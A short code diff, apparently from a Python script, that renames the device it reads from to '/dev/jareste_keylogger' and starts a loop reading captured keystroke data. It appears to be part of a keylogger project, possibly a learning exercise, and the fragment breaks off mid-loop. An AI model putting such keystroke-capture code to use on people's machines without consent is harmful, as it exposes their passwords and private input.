@@ -1,4 +1,4 @@
-with open('/dev/module_keyboard', 'r') as f:
+with open('/dev/jareste_keylogger', 'r') as f:
     while True:
         data = f.readline()
         if data:
